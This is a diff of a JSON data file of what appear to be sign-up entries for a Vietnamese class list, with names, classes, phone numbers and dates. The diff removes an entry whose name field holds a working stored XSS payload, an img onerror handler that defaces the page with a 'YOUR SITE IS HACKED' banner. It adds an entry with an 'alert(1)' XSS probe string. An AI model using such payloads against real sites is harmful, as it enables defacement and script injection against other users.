@@ -144,11 +144,11 @@
     "date": "2026-08-18T18:43:56.684171+07:00"
   },
   {
-    "name": "<img src=x style=\"display:none\" onerror=\"document.title='HACKED';document.body.style.cssText='margin:0;background:#0a0a0a;color:#eee;font-family:monospace;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center';document.body.innerHTML=`<div><div style='font-size:64px'>&#9760;</div><h1 style='color:#e11;letter-spacing:3px'>YOUR SITE IS HACKED</h1><p>Vulnerability: <b>Stored XSS</b> &mdash; danh-sach.html:184 (innerHTML)</p></div>`\">",
-    "lop": "Chuyên Anh",
-    "sdt": "0999999999",
+    "name": "alert(1)Kiểm Tra XSS",
+    "lop": "Chuyên Lý",
+    "sdt": "0999999998",
     "soluong": "1 người",
-    "ghichu": "",
-    "date": "2026-08-18T19:29:50.903787+07:00"
+    "ghichu": "test",
+    "date": "2026-08-18T19:47:47.230029+07:00"
   }
 ]
